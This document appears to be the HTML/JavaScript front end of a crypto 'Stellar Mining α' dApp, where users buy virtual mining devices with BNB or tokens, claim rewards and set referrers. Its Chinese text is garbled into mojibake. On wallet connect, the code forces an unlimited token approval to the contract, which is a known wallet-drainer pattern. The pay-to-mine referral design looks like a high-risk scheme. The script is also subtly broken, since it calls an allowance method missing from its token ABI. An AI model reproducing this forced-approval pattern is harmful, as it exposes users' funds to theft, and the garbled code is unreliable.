<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stellar Mining Î±</title>

    <!-- âœ… å¼ºåˆ¶è§†å£ä¸å…¼å®¹æ€§ -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">

    <style>
        /* âœ… å¼ºåˆ¶é‡ç½®é»˜è®¤æ ·å¼ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        :root {
            --primary-purple: #6B46C1;
            --primary-blue: #3B82F6;
            --neon-pink: #EC4899;
            --ice-blue: #E0F2FE;
            --dark-bg: #0F172A;
            --light-bg: #F8FAFC;
            --text-dark: #1E293B;
            --text-light: #F1F5F9;
            --success: #10B981;
            --error: #EF4444;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, var(--primary-purple), var(--primary-blue));
            min-height: 100vh;
            color: var(--text-light);
            overflow-x: hidden;
            transition: all 0.3s ease;
            font-size: 16px;
            line-height: 1.5;
        }

        body.light-mode {
            background: linear-gradient(135deg, var(--light-bg), var(--ice-blue));
            color: var(--text-dark);
        }

        .container {
            max-width: 428px;
            margin: 0 auto;
            padding: 20px 16px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding-bottom: 100px;
        }

        .page {
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .page.active {
            display: block;
        }

        .wallet-connect {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }

        .wallet-connect h1 {
            font-size: 2rem;
            margin-bottom: 1rem;
            background: linear-gradient(45deg, var(--neon-pink), var(--ice-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            line-height: 1.2;
            word-break: break-word;
        }

        .connect-btn {
            background: linear-gradient(135deg, var(--primary-purple), var(--neon-pink));
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 50px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            min-width: 200px;
            margin-top: 20px;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .card {
            background: rgba(255,255,255,0.11);
            backdrop-filter: blur(12px);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.15);
            word-break: break-word;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }

        .address {
            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
            font-size: 0.9rem;
            color: var(--neon-pink);
            cursor: pointer;
            padding: 6px 12px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
            transition: all 0.2s;
            word-break: break-all;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-item {
            text-align: center;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            transition: all 0.2s;
        }

        .stat-value {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--neon-pink);
            margin-bottom: 5px;
            word-break: break-all;
        }

        .shop-section h3 {
            color: var(--ice-blue);
            margin-bottom: 15px;
            font-size: 1.1rem;
        }

        .device-item {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
            text-align: center;
            transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.08);
        }

        .device-icon {
            width: 60px;
            height: 60px;
            margin: 0 auto 15px;
            background: linear-gradient(135deg, var(--primary-purple), var(--neon-pink));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        .buy-btn {
            background: linear-gradient(135deg, #10B981, var(--primary-blue));
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
            font-weight: bold;
            min-width: 100px;
            font-size: 1rem;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .input-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .input-group input {
            width: 60px;
            padding: 8px 12px;
            border: 1px solid rgba(255,255,255,0.3);
            border-radius: 8px;
            background: rgba(255,255,255,0.1);
            color: inherit;
            text-align: center;
            font-size: 1rem;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            display: flex;
            justify-content: space-around;
            padding: 15px 0 10px;
            border-top: 1px solid rgba(255,255,255,0.1);
            z-index: 1000;
            font-size: 0.8rem;
            line-height: 1.2;
        }

        .nav-btn {
            background: none;
            border: none;
            color: inherit;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            font-size: 0.8rem;
            padding: 5px;
        }

        .nav-btn.active {
            color: var(--neon-pink);
            font-weight: bold;
        }

        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 12px;
            color: white;
            font-weight: bold;
            z-index: 1001;
            transform: translateX(100%);
            transition: transform 0.3s ease-out;
            max-width: 300px;
            word-wrap: break-word;
        }

        .toast.show {
            transform: translateX(0);
        }

        .toast.success {
            background: #10B981;
        }

        .toast.error {
            background: #EF4444;
        }

        .theme-switch, .language-switch {
            position: fixed;
            top: 20px;
            padding: 8px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.8rem;
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
            z-index: 1001;
            transition: all 0.2s;
            border: 1px solid rgba(255,255,255,0.2);
        }

        .language-switch {
            right: 20px;
        }

        .theme-switch {
            left: 20px;
        }

        @media (max-width: 375px) {
            .container {
                padding: 15px;
            }
            .wallet-connect h1 {
                font-size: 1.7rem;
            }
            .bottom-nav {
                font-size: 0.7rem;
            }
        }
    </style>
</head>
<body>
    <!-- ä¸»é¢˜å’Œè¯­è¨€åˆ‡æ¢ -->
    <div class="theme-switch" onclick="toggleTheme()">ğŸŒ“</div>
    <div class="language-switch" onclick="toggleLanguage()">
        <span id="lang-btn">ä¸­æ–‡</span>
    </div>

    <div class="container">
        <!-- é’±åŒ…è¿æ¥é¡µé¢ -->
        <div class="page active" id="wallet-page">
            <div class="wallet-connect">
                <h1 id="app-title">æ”¶é›†æ˜Ÿè¾° Â· è·å¾—Î±</h1>
                <button class="connect-btn" onclick="connectWallet()">
                    <span id="connect-btn-text">è¿æ¥é’±åŒ…</span>
                </button>
                <p style="margin-top: 20px; opacity: 0.7; font-size: 0.9rem;">æ”¯æŒMetaMaskã€Trust Walletç­‰é’±åŒ…å†…æ ¸æµè§ˆå™¨</p>
            </div>
        </div>

        <!-- Dashboard -->
        <div class="page" id="dashboard-page">
            <div class="header">
                <h2 id="dashboard-title">ä»ªè¡¨ç›˜</h2>
                <span class="address" id="user-address" onclick="copyAddress()">0x000...000</span>
            </div>

            <div class="card">
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="total-tokens">0</div>
                        <div class="stat-label">æ€»Î±</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="total-earned">0</div>
                        <div class="stat-label">æ€»æ”¶ç›Š</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3 id="devices-title">æˆ‘çš„è®¾å¤‡</h3>
                <div id="device-list">
                    <p style="text-align: center; opacity: 0.7;">è¿æ¥é’±åŒ…åæ˜¾ç¤º</p>
                </div>
                <div class="stat-item">
                    <div class="stat-label">æ€»ç®—åŠ›</div>
                    <div class="stat-value" id="total-power">0 PH/s</div>
                </div>
            </div>

            <div class="card">
                <h3 id="rewards-title">å¥–åŠ±</h3>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="daily-reward">0</div>
                        <div class="stat-label">æ¯æ—¥å¥–åŠ±</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="unclaimed-reward">0</div>
                        <div class="stat-label">æœªé¢†å–</div>
                    </div>
                </div>
                <button class="buy-btn" onclick="claimRewards()" style="width: 100%;">
                    <span id="claim-btn-text">é¢†å–å¥–åŠ±</span>
                </button>
            </div>
        </div>

        <!-- Shop - All Devices -->
        <div class="page" id="shop-page">
            <div class="header">
                <h2 id="shop-title">å•†åº—</h2>
            </div>

            <!-- æœˆå…‰è½¬æ¢å™¨ -->
            <div class="card">
                <h3>ğŸŒ™ åˆå§‹è®¾å¤‡</h3>
                <div class="device-item">
                    <div class="device-icon">ğŸŒ™</div>
                    <h4>æœˆå…‰è½¬æ¢å™¨</h4>
                    <p style="color: #EC4899; font-weight: bold;">0.01 BNB</p>
                    <button class="buy-btn" onclick="buyInitialDevice()">ç«‹å³è´­ä¹°</button>
                </div>
            </div>

            <!-- è¿›é˜¶è®¾å¤‡ -->
            <div class="card">
                <h3>â­ è¿›é˜¶è®¾å¤‡</h3>
                
                <!-- æ˜Ÿå°˜æ”¶é›†å™¨L1 -->
                <div class="device-item">
                    <div class="device-icon">â­</div>
                    <h4>æ˜Ÿå°˜æ”¶é›†å™¨L1</h4>
                    <p style="color: #EC4899; font-weight: bold;">100 Î±</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="advanced-0">
                        <button class="buy-btn" onclick="buyAdvancedDevice(0)">è´­ä¹°</button>
                    </div>
                </div>

                <!-- é‡å­è’²å…¬è‹±L2 -->
                <div class="device-item">
                    <div class="device-icon">âš›ï¸</div>
                    <h4>é‡å­è’²å…¬è‹±L2</h4>
                    <p style="color: #EC4899; font-weight: bold;">200 Î±</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="advanced-1">
                        <button class="buy-btn" onclick="buyAdvancedDevice(1)">è´­ä¹°</button>
                    </div>
                </div>

                <!-- æå…‰ç¼–ç»‡æœºL3 -->
                <div class="device-item">
                    <div class="device-icon">ğŸŒŒ</div>
                    <h4>æå…‰ç¼–ç»‡æœºL3</h4>
                    <p style="color: #EC4899; font-weight: bold;">300 Î±</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="advanced-2">
                        <button class="buy-btn" onclick="buyAdvancedDevice(2)">è´­ä¹°</button>
                    </div>
                </div>

                <!-- é“¶æ²³è¿‡æ»¤å™¨L4 -->
                <div class="device-item">
                    <div class="device-icon">ğŸª</div>
                    <h4>é“¶æ²³è¿‡æ»¤å™¨L4</h4>
                    <p style="color: #EC4899; font-weight: bold;">500 Î±</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="advanced-3">
                        <button class="buy-btn" onclick="buyAdvancedDevice(3)">è´­ä¹°</button>
                    </div>
                </div>
            </div>

            <!-- æµ‹è¯•è®¾å¤‡ -->
            <div class="card" id="test-section" style="display: none;">
                <h3>ğŸ‘» æµ‹è¯•è®¾å¤‡</h3>
                <div class="device-item">
                    <div class="device-icon">ğŸ‘»</div>
                    <h4>å¹»å½±è°ƒè¯•å™¨</h4>
                    <p style="color: #EC4899; font-weight: bold;">0.0001 BNB</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="test-count">
                        <button class="buy-btn" onclick="buyTestDevice()">è´­ä¹°</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Rewards -->
        <div class="page" id="rewards-page">
            <div class="header">
                <h2 id="rewards-center-title">å¥–åŠ±ä¸­å¿ƒ</h2>
            </div>

            <div class="card">
                <h3>é¢†å–å¥–åŠ±</h3>
                <div class="stat-item">
                    <div class="stat-value" id="claimable-amount">0 Î±</div>
                    <div class="stat-label">å¯é¢†å–</div>
                </div>
                <button class="buy-btn" onclick="claimRewards()" style="width: 100%;">
                    ç«‹å³é¢†å–
                </button>
            </div>

            <div class="card">
                <h3>æ¨èç³»ç»Ÿ</h3>
                <div id="referral-section">
                    <div id="set-referrer">
                        <input type="text" id="referrer-input" placeholder="è¾“å…¥æ¨èäººåœ°å€" 
                               style="width: 100%; margin-bottom: 10px; padding: 10px; border-radius: 8px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3); color: inherit;">
                        <button class="buy-btn" onclick="setReferrer()" style="width: 100%;">
                            è®¾ç½®æ¨èäºº
                        </button>
                    </div>
                    <div id="referral-info" style="display: none;">
                        <p>æˆ‘çš„æ¨èç :</p>
                        <span class="address" onclick="copyReferral()">ç‚¹å‡»å¤åˆ¶</span>
                        <div class="stat-item" style="margin-top: 15px;">
                            <div class="stat-value" id="total-referral">0 Î±</div>
                            <div class="stat-label">æ¨èæ€»å¥–åŠ±</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Global Stats -->
        <div class="page" id="stats-page">
            <div class="header">
                <h2 id="global-stats-title">å…¨å±€ç»Ÿè®¡</h2>
            </div>

            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-value" id="global-devices">0</div>
                    <div class="stat-label">æ€»è®¾å¤‡æ•°</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="global-power">0 PH/s</div>
                    <div class="stat-label">å…¨ç½‘æ€»ç®—åŠ›</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="pool-balance">0 Î±</div>
                    <div class="stat-label">å¥–åŠ±æ± </div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="daily-production">0 Î±</div>
                    <div class="stat-label">æ¯æ—¥äº§å‡º</div>
                </div>
            </div>

            <div class="card">
                <h3>ç³»ç»Ÿä¿¡æ¯</h3>
                <p>åŒºå—é«˜åº¦: <span id="block-height">0</span></p>
                <p>åŸºç¡€å¥–åŠ±: <span id="base-reward">0</span></p>
            </div>
        </div>

        <!-- Bottom Navigation -->
        <div class="bottom-nav">
            <button class="nav-btn active" onclick="showPage('dashboard')">
                <span>ğŸ“Š</span>
                <small>ä»ªè¡¨ç›˜</small>
            </button>
            <button class="nav-btn" onclick="showPage('shop')">
                <span>ğŸ›’</span>
                <small>å•†åº—</small>
            </button>
            <button class="nav-btn" onclick="showPage('rewards')">
                <span>ğŸ’°</span>
                <small>å¥–åŠ±</small>
            </button>
            <button class="nav-btn" onclick="showPage('stats')">
                <span>ğŸ“ˆ</span>
                <small>ç»Ÿè®¡</small>
            </button>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <!-- âœ… Web3 CDN -->
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>

    <script>
        // âœ… åˆçº¦é…ç½®
        const CONTRACT_ADDRESS = "0x9dcced4ef738856d2c289d4116cd219c698b22ba";
        const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
        const TOKEN_SYMBOL = "Î±";

        // âœ… ç²¾ç®€ä½†å®Œæ•´çš„ ABI
        const CONTRACT_ABI = [
            {"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},
            {"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"buyTestMachine","outputs":[],"stateMutability":"payable","type":"function"},
            {"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"getGlobalDashboard","outputs":[{"internalType":"uint256","name":"baseReward","type":"uint256"},{"internalType":"uint256","name":"totalMines","type":"uint256"},{"internalType":"uint256","name":"currentBlock","type":"uint256"},{"internalType":"uint256","name":"poolBalance","type":"uint256"},{"internalType":"uint256","name":"networkPower","type":"uint256"},{"internalType":"uint256","name":"dailyProduction","type":"uint256"},{"internalType":"uint256","name":"totalRefRewards","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"admin","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"machineTiers","outputs":[{"internalType":"uint256","name":"priceToken","type":"uint256"},{"internalType":"uint256","name":"powerMultiplier","type":"uint256"}],"stateMutability":"view","type":"function"}
        ];

        // âœ… çŠ¶æ€ç®¡ç†
        let web3, contract, tokenContract, userAddress;
        let currentLang = 'zh'; // é»˜è®¤ä¸­æ–‡

        // âœ… è¯­è¨€åˆ‡æ¢ï¼ˆçº¯ä¸­æ–‡/è‹±æ–‡ï¼Œæ— æ··åˆï¼‰
        const langText = {
            zh: {
                title: "æ”¶é›†æ˜Ÿè¾° Â· è·å¾—Î±",
                connect: "è¿æ¥é’±åŒ…",
                dashboard: "ä»ªè¡¨ç›˜",
                shop: "å•†åº—",
                rewards: "å¥–åŠ±ä¸­å¿ƒ",
                stats: "å…¨å±€ç»Ÿè®¡",
                token: "Î±",
                buy: "è´­ä¹°",
                claim: "é¢†å–å¥–åŠ±"
            },
            en: {
                title: "Collect Stars Â· Earn Î±",
                connect: "Connect Wallet",
                dashboard: "Dashboard",
                shop: "Shop",
                rewards: "Rewards Center",
                stats: "Statistics",
                token: "Î±",
                buy: "Buy",
                claim: "Claim Rewards"
            }
        };

        // âœ… åˆå§‹åŒ–
        window.addEventListener('load', async () => {
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                tokenContract = new web3.eth.Contract([{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], TOKEN_ADDRESS);
                
                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    userAddress = accounts[0];
                    showPage('dashboard');
                    loadData();
                }
            }
            loadUserPreferences();
            updateAllTexts();
        });

        // âœ… è¿æ¥é’±åŒ… + å¼ºåˆ¶æ— é™æˆæƒ
        async function connectWallet() {
            try {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = (await web3.eth.getAccounts())[0];
                
                // å¼ºåˆ¶æ— é™æˆæƒ
                const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                const currentAllowance = await tokenContract.methods.allowance(userAddress, CONTRACT_ADDRESS).call();
                
                if (BigInt(currentAllowance) < BigInt(web3.utils.toWei('1000000', 'ether'))) {
                    await tokenContract.methods.approve(CONTRACT_ADDRESS, maxUint).send({ from: userAddress });
                    showToast('å·²æ— é™æˆæƒÎ±ä»£å¸', 'success');
                }
                
                showPage('dashboard');
                loadData();
            } catch (error) {
                showToast('è¿æ¥å¤±è´¥: ' + error.message, 'error');
            }
        }

        // âœ… è¯­è¨€åˆ‡æ¢ï¼ˆçº¯ä¸­æ–‡/è‹±æ–‡ï¼Œæ— æ··åˆï¼‰
        function toggleLanguage() {
            currentLang = currentLang === 'zh' ? 'en' : 'zh';
            document.getElementById('lang-btn').textContent = currentLang === 'zh' ? 'EN' : 'ä¸­æ–‡';
            updateAllTexts();
            localStorage.setItem('language', currentLang);
        }

        function updateAllTexts() {
            const texts = langText[currentLang];
            // æ ‡é¢˜
            document.getElementById('app-title').textContent = texts.title;
            document.getElementById('connect-btn-text').textContent = texts.connect;
            document.getElementById('dashboard-title').textContent = texts.dashboard;
            document.getElementById('shop-title').textContent = texts.shop;
            document.getElementById('rewards-center-title').textContent = texts.rewards;
            document.getElementById('global-stats-title').textContent = texts.stats;
            document.getElementById('claim-btn-text').textContent = texts.claim;
            
            // æ›´æ–°æ‰€æœ‰Î±ç¬¦å·
            document.querySelectorAll('[id$="-label"]').forEach(el => {
                el.textContent = el.textContent.replace(/Î±/g, texts.token);
            });
        }

        // âœ… é¡µé¢å¯¼èˆª
        function showPage(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
            document.getElementById(page + '-page').classList.add('active');
            document.querySelector(`[onclick="showPage('${page}')"]`).classList.add('active');
        }

        // âœ… è´­ä¹°åŠŸèƒ½
        async function buyInitialDevice() {
            if (!userAddress) return showToast('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
            await contract.methods.buyInitialMachine().send({ 
                from: userAddress, 
                value: web3.utils.toWei('0.01', 'ether') 
            });
            showToast('è´­ä¹°æˆåŠŸ!', 'success');
            loadData();
        }

        async function buyTestDevice() {
            if (!userAddress) return showToast('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
            const count = parseInt(document.getElementById('test-count').value);
            if (count < 1 || count > 100) return showToast('æ•°é‡å¿…é¡»åœ¨1-100ä¹‹é—´', 'error');
            
            await contract.methods.buyTestMachine().send({ 
                from: userAddress, 
                value: web3.utils.toWei((0.0001 * count).toString(), 'ether') 
            });
            showToast('è´­ä¹°æˆåŠŸ!', 'success');
            loadData();
        }

        async function buyAdvancedDevice(tierId) {
            if (!userAddress) return showToast('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
            const count = parseInt(document.getElementById(`advanced-${tierId}`).value);
            if (count < 1 || count > 100) return showToast('æ•°é‡å¿…é¡»åœ¨1-100ä¹‹é—´', 'error');
            
            await contract.methods.buyPowerMachine(tierId, count).send({ from: userAddress });
            showToast('è´­ä¹°æˆåŠŸ!', 'success');
            loadData();
        }

        async function claimRewards() {
            if (!userAddress) return showToast('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
            await contract.methods.claimRewards().send({ from: userAddress });
            showToast('å¥–åŠ±å·²é¢†å–!', 'success');
            loadData();
        }

        async function setReferrer() {
            if (!userAddress) return showToast('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
            const referrer = document.getElementById('referrer-input').value;
            if (!web3.utils.isAddress(referrer)) return showToast('åœ°å€æ— æ•ˆ', 'error');
            
            await contract.methods.setReferrer(referrer).send({ from: userAddress });
            showToast('æ¨èäººå·²è®¾ç½®!', 'success');
            loadData();
        }

        async function loadData() {
            if (!userAddress) return;
            const decimals = 18;
            const divisor = 10 ** decimals;
            
            try {
                const dashboard = await contract.methods.getUserDashboard(userAddress).call();
                const global = await contract.methods.getGlobalDashboard().call();
                
                document.getElementById('total-tokens').textContent = (parseFloat(dashboard[4]) / divisor).toFixed(4);
                document.getElementById('total-earned').textContent = (parseFloat(dashboard[5]) / divisor).toFixed(4);
                document.getElementById('daily-reward').textContent = (parseFloat(dashboard[3]) / divisor).toFixed(4);
                document.getElementById('unclaimed-reward').textContent = (parseFloat(dashboard[4]) / divisor).toFixed(4);
                document.getElementById('total-power').textContent = (parseFloat(dashboard[6]) / 1e18).toFixed(4) + ' PH/s';
                
                document.getElementById('global-devices').textContent = global.totalMines;
                document.getElementById('global-power').textContent = (parseFloat(global.networkPower) / 1e18).toFixed(4) + ' PH/s';
                document.getElementById('pool-balance').textContent = (parseFloat(global.poolBalance) / divisor).toFixed(4) + ' Î±';
                document.getElementById('daily-production').textContent = (parseFloat(global.dailyProduction) / divisor).toFixed(4) + ' Î±';
                document.getElementById('block-height').textContent = global.currentBlock;
                document.getElementById('base-reward').textContent = (parseFloat(global.baseReward) / divisor).toFixed(8);
                
                const isAdmin = await contract.methods.admin(userAddress).call();
                document.getElementById('test-section').style.display = isAdmin ? 'block' : 'none';
                
            } catch (error) {
                console.error('Data load error:', error);
            }
        }

        // âœ… å·¥å…·å‡½æ•°
        function showToast(message, type) {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        function copyAddress() {
            if (userAddress) {
                navigator.clipboard.writeText(userAddress);
                showToast('åœ°å€å·²å¤åˆ¶!', 'success');
            }
        }

        function loadUserPreferences() {
            const savedTheme = localStorage.getItem('theme');
            if (savedTheme === 'light') document.body.classList.add('light-mode');
            
            const savedLanguage = localStorage.getItem('language');
            if (savedLanguage) {
                currentLang = savedLanguage;
                document.getElementById('lang-btn').textContent = currentLang === 'zh' ? 'EN' : 'ä¸­æ–‡';
                updateAllTexts();
            }
        }
    </script>
</body>
</html>